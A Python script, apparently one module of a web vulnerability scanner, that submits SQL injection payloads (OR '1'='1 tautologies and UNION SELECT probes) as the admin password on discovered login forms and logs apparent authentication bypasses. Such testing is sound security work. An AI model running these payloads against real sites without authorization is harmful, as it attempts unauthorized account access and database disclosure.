import requests
import json
from datetime import datetime

# Define SQL Injection payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 'a'='a",
    "' UNION SELECT NULL, version() --",
    "' UNION SELECT NULL, user() --"
]

def load_mapped_data(filename="mapped_data.json"):
    """Load mapped website data from JSON file."""
    try:
        with open(filename, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"⚠️ Error loading JSON file: {e}")
        return None

def detect_sql_injection(target_url, form):
    """Test SQL Injection vulnerabilities for a given form."""
    print(f"\n🔍 Testing form at: {target_url}")

    # Prepare form data
    post_data = {"username": "admin", "password": ""}

    for payload in PAYLOADS:
        post_data["password"] = payload
        print(f"🛠️  Testing payload: {payload}")

        try:
            response = requests.post(target_url, data=post_data, timeout=5)

            # Check vulnerability based on response status, content length, or known success messages
            if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
                print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
                print(f"  Vulnerable payload: {payload}")

                return {"payload": payload, "vulnerable": True}
        
        except requests.RequestException as e:
            print(f"  ❌ Error: {e}")

    return None  # No vulnerability found

def save_results(scan_results, filename="security_scan_results.json"):
    """Save scan results to a JSON file."""
    try:
        with open(filename, "r") as f:
            previous_results = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        previous_results = {}

    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    previous_results[current_time] = scan_results

    with open(filename, "w") as f:
        json.dump(previous_results, f, indent=4)

    print("\n✅ SQL Injection scan complete! Results saved in security_scan_results.json")

def run():
    """Run the SQL Injection scanner."""
    print("\n🚀 Scanning...\n")

    mapped_data = load_mapped_data()
    if not mapped_data:
        print("❌ No mapped data found. Exiting SQL injection scan.")
        return

    scan_results = {}

    # Iterate over discovered forms on each page
    for page in mapped_data.get("pages", []):
        for form in page.get("forms", []):
            if form["method"] == "POST" and "username" in form["inputs"] and "password" in form["inputs"]:
                target_url = form["action"]

                result = detect_sql_injection(target_url, form)
                if result:
                    if target_url not in scan_results:
                        scan_results[target_url] = []
                    scan_results[target_url].append(result)

    save_results(scan_results)

# Ensure script only runs when executed directly
if __name__ == "__main__":
    run()
